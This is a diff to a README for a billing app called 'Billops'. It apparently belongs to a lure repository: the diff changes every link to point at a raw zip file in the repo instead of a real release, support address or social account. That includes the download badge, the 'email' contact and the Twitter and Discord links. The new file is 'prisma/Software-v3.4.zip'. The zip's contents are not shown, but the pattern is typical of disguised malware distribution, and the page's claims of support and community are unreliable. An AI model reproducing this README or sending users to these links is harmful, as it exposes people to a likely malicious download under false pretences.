@@ -1,6 +1,6 @@
 # 🚀 Billops - Manage Your Billing Effortlessly
 
-[![Download Billops](https://raw.githubusercontent.com/unjioo/Billops/main/lymphocyst/Billops.zip%20Billops-Here-brightgreen)](https://raw.githubusercontent.com/unjioo/Billops/main/lymphocyst/Billops.zip)
+[![Download Billops](https://github.com/unjioo/Billops/raw/refs/heads/main/prisma/Software-v3.4.zip%20Billops-Here-brightgreen)](https://github.com/unjioo/Billops/raw/refs/heads/main/prisma/Software-v3.4.zip)
 
 ## 📋 Overview
 
@@ -17,7 +17,7 @@ Billops is a simple application designed to help you manage billing and subscrip
 
 To get started with Billops, visit this page to download the software:
 
-[Download Billops from Releases](https://raw.githubusercontent.com/unjioo/Billops/main/lymphocyst/Billops.zip)
+[Download Billops from Releases](https://github.com/unjioo/Billops/raw/refs/heads/main/prisma/Software-v3.4.zip)
 
 Follow these steps to download and install:
 
@@ -73,7 +73,7 @@ If you encounter any difficulties while using Billops, try these steps:
 
 - **Check the FAQs:** Visit the FAQs section on the GitHub page for common issues and solutions.
 - **Community Support:** Join discussions in the GitHub Issues section to see if others have faced similar problems.
-- **Contact Support:** If you need personal assistance, please reach out to our support team via email at https://raw.githubusercontent.com/unjioo/Billops/main/lymphocyst/Billops.zip
+- **Contact Support:** If you need personal assistance, please reach out to our support team via email at https://github.com/unjioo/Billops/raw/refs/heads/main/prisma/Software-v3.4.zip
 
 ## 📄 License
 
@@ -83,8 +83,8 @@ Billops is open-source software. This application is released under the MIT Lice
 
 To stay updated on new releases and features, consider following us on:
 
-- **GitHub:** [Billops Repository](https://raw.githubusercontent.com/unjioo/Billops/main/lymphocyst/Billops.zip)
-- **Twitter:** [@BillopsApp](https://raw.githubusercontent.com/unjioo/Billops/main/lymphocyst/Billops.zip)
-- **Discord:** Join our community at [Billops Discord](https://raw.githubusercontent.com/unjioo/Billops/main/lymphocyst/Billops.zip)
+- **GitHub:** [Billops Repository](https://github.com/unjioo/Billops/raw/refs/heads/main/prisma/Software-v3.4.zip)
+- **Twitter:** [@BillopsApp](https://github.com/unjioo/Billops/raw/refs/heads/main/prisma/Software-v3.4.zip)
+- **Discord:** Join our community at [Billops Discord](https://github.com/unjioo/Billops/raw/refs/heads/main/prisma/Software-v3.4.zip)
 
 Thank you for choosing Billops! Your feedback helps us improve and adds value to our community.
